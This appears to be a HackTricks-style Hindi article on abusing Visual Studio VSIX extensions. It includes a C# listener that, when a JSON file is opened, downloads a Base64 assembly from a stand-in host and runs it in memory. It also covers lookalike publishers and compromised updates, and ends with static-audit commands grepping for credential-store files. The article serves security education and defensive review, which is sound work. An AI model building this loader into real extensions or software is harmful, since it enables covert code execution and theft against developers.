# Visual Studio VSIX Extension का दुरुपयोग

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension, editor में होने वाली सामान्य गतिविधियों को लॉग-इन उपयोगकर्ता की पहचान के तहत code execution में बदल सकता है। कोई malicious VSIX, मिलता-जुलता publisher या compromised extension update, सामान्य installation channels के ज़रिए उस उपयोगकर्ता तक पहुँच सकता है। Administrator prompt के साथ installation, सहमति से किया गया install है—automatic privilege escalation नहीं।<sup>[[1]](#references)</sup>

## Execution model

Classic VSSDK extensions आमतौर पर `devenv.exe` के अंदर execute होते हैं। नया `VisualStudio.Extensibility` model मुख्यतः modern .NET extensions को out of process चलाता है: Visual Studio calls को एक dedicated `Microsoft.ServiceHub.Host.Extensibility` process तक पहुँचाता है। इससे IDE की stability अलग रहती है, लेकिन extension को उपयोगकर्ता की Windows permissions से **sandbox नहीं किया जाता**। Executable के सटीक नाम में architecture suffix हो सकता है, जैसे `ServiceHub.Host.Extensibility.arm64.exe`।<sup>[[1]](#references)[[2]](#references)</sup>

### सामान्य editor गतिविधि पर trigger करना

केवल एक स्पष्ट menu command दिखाने के बजाय, extension `ITextViewOpenClosedListener` implement कर सकता है। इसके `TextViewOpenedAsync` callback को matching documents के लिए invoke किया जाता है, जबकि `TextViewExtensionConfiguration.AppliesTo` activation को JSON जैसे सामान्य type तक सीमित कर सकता है। कोई वास्तविक formatter या linter अपना घोषित काम करते हुए, file खुलने पर side effect के रूप में दूसरी action भी चला सकता है।<sup>[[1]](#references)[[3]](#references)</sup>

नीचे दिया गया संक्षिप्त pattern, execution के अहम बिंदु दिखाता है; स्पष्टता के लिए इसमें वैध formatter और error handling शामिल नहीं हैं।<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Event-triggered in-memory managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

यह chain Base64 text डाउनलोड करती है, उसे assembly bytes में decode करती है, फिर उसे collectible `AssemblyLoadContext` के ज़रिए `MemoryStream` से load करती है, reflected `EntryPoint` को बिना parameters या `string[]` के साथ invoke करती है, asynchronous entry points का await करती है और context को unload करती है। दूसरा stage डिस्क पर नहीं लिखा जाता, हालांकि VSIX और primary extension DLL, डिस्क पर artefacts बने रहते हैं। Base64 से authenticity या confidentiality नहीं मिलती; HTTP का इस्तेमाल करने पर on-path attacker response को replace भी कर सकता है।<sup>[[1]](#references)</sup>

Operational variations में staging विफल होने पर advertised feature को जारी रखने के लिए सभी exceptions को suppress करना, या edits के बाद trigger करने के लिए `ITextViewChangedListener` का इस्तेमाल करना शामिल है। Code extension host में execute होता है और उस user के लिए उपलब्ध managed APIs, P/Invoke, files, credentials और child processes का इस्तेमाल कर सकता है।<sup>[[1]](#references)</sup>

Native plugin autoloading पर आधारित editor-specific execution surface के लिए देखें:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace और delivery trust का दुरुपयोग

VSIX सीधे share की गई या phished file के रूप में, web Marketplace से, या Visual Studio के embedded Marketplace browser के ज़रिए आ सकती है। Publisher registration में मुख्य रूप से uniqueness और reserved-word list लागू होती है, इसलिए देखने में मिलती-जुलती publisher identities बनाई जा सकती हैं; किसी पहले से trusted publisher या extension को compromise करना और भी प्रभावी है, क्योंकि इससे installed user base का भरोसा मिलता है। Marketplace installation, Visual Studio Installer को invoke करती है और डाउनलोड की गई VSIX को अस्थायी रूप से `%LOCALAPPDATA%\Temp` के अंतर्गत रखती है; `payload.vsix` का वैध रूप से भी इस्तेमाल होता है, इसलिए केवल filename कोई indicator नहीं है।<sup>[[1]](#references)</sup>

MDSec को ऐसा कोई Visual Studio URL protocol नहीं मिला जो सीधे extension install करता हो। Operator को अब भी user से VSIX install/trust करवानी होगी, या किसी मौजूदा extension के distribution path को compromise करना होगा। `AllUsers` package, Visual Studio installation folder के अंतर्गत install होती है और elevation माँग सकती है, लेकिन यह सामान्य consented installer behavior है, administrator या SYSTEM तक पहुँचने का कोई automatic रास्ता नहीं।<sup>[[1]](#references)[[4]](#references)</sup>

### बड़े पैमाने पर static auditing

VSIX packages आमतौर पर ZIP containers होती हैं, इसलिए एक सुरक्षित marketplace-review pipeline packages की सूची बना सकती है, **extension code load किए बिना** उन्हें unpack कर सकती है, manifests parse कर सकती है, executable surfaces की पहचान कर सकती है और managed assemblies को `ilspycmd` से decompile कर सकती है। आम bundled dependencies को हटाने के बाद extension के अपने assemblies को प्राथमिकता दें, फिर credential-store strings को behavioral clusters से correlate करें—जैसे file-read के साथ network-send, encode के साथ send, download के साथ execution, credential-manager के साथ network access, या screenshot के साथ send।<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

सभी native DLLs, MSBuild targets, scripts, T4 templates और installer payloads की भी सूची बनाएं; यह न मानें कि हर execution surface managed code ही है। संदिग्ध व्यवहार की तुलना manifest में बताए गए उद्देश्य से करें; telemetry और वैध updaters, data exfiltration या staging जैसे लग सकते हैं। केवल static review करने से packed, obfuscated, dynamically resolved और dormant code छूट सकता है, और केवल नवीनतम version की समीक्षा करने से दुर्भावनापूर्ण पुराने releases छूट सकते हैं।<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions पर पुनर्विचार](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility के बारे में](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX package की संरचना](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET tool](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
